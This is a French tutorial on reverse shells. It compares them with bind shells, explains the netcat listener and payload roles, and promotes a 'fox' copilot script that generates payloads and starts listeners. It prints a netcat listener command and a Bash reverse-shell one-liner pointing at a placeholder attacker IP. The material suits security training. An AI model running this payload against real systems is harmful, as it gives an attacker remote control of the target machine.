# Tutoriel : Le concept des Reverse Shells

Un "shell" est une interface de ligne de commande pour contrôler un système. Obtenir un shell sur une machine cible est souvent le but principal d'un attaquant. Il y a deux manières principales d'y parvenir : le Bind Shell et le Reverse Shell.

---

## Bind Shell vs Reverse Shell

-   **Bind Shell :** Le payload sur la machine **cible** ouvre un port et attend une connexion **entrante** de l'attaquant. C'est simple, mais souvent bloqué par les pare-feux (firewalls) qui interdisent les connexions entrantes sur des ports aléatoires.

-   **Reverse Shell (Shell Inversé) :** Le payload sur la machine **cible** initie une connexion **sortante** vers l'attaquant. L'attaquant, lui, se met en écoute sur un port. C'est beaucoup plus efficace car les règles de pare-feu sont souvent plus permissives pour le trafic sortant (la cible a le droit de se connecter à l'extérieur).

**Le Reverse Shell est la technique la plus utilisée dans 90% des cas.**

---

## Les Deux Composants d'un Reverse Shell

Pour qu'un reverse shell fonctionne, il faut deux choses :

### 1. Le Listener (L'auditeur)

C'est un programme sur **VOTRE** machine qui ouvre un port et attend la connexion de la cible. L'outil le plus simple pour cela est **Netcat** (`nc`).

```bash
# Se met en écoute sur le port 4444
nc -lvnp 4444
```

- `-l` : Mode écoute (Listen).
- `-v` : Verbeux, pour voir quand quelqu'un se connecte.
- `-n` : Ne pas résoudre les noms DNS (plus rapide).
- `-p` : Spécifie le port.

### 2. Le Payload (La charge utile)

C'est la commande que vous devez exécuter sur la machine **CIBLE**. Cette commande unique lui dit de se connecter à votre machine (votre IP, votre port) et de vous donner son shell.

Il existe des centaines de variantes de payloads en fonction du système (Linux, Windows) et des technologies disponibles sur la cible (Bash, Python, PHP, etc.).

**Exemple en Bash :**
```bash
bash -i >& /dev/tcp/VOTRE_IP/VOTRE_PORT 0>&1
```

---

### 💡 L'Aide du Copilote

Mettre en place un reverse shell peut être source d'erreurs (faute de frappe dans l'IP, mauvais payload...). Le script `fox` automatise et fiabilise ce processus de deux manières :

1.  **Le Générateur de Payloads (`Payload Generator > Reverse Shells`)
    -   **Détection d'IP :** Il détecte automatiquement votre adresse IP (LHOST) pour la pré-remplir.
    -   **Guidage :** Il vous demande simplement le port d'écoute (LPORT).
    -   **Bibliothèque de Payloads :** Il vous propose un menu pour choisir le type de payload (Bash, Python, PHP...) à partir de modèles fiables.
    -   **Génération Automatique :** Il génère la commande exacte, sans risque d'erreur, et la sauvegarde dans un fichier pour un copier-coller facile.

2.  **Le Listener Rapide (`Accès Rapide > Démarrer un Listener Netcat`)
    -   Cette option vous demande juste le port et lance la commande `nc -lvnp` pour vous. Plus besoin de mémoriser les options.

**Avantage :** Le copilote élimine les erreurs manuelles et accélère considérablement la mise en place d'un reverse shell, vous permettant de vous concentrer sur l'exploitation plutôt que sur la syntaxe.
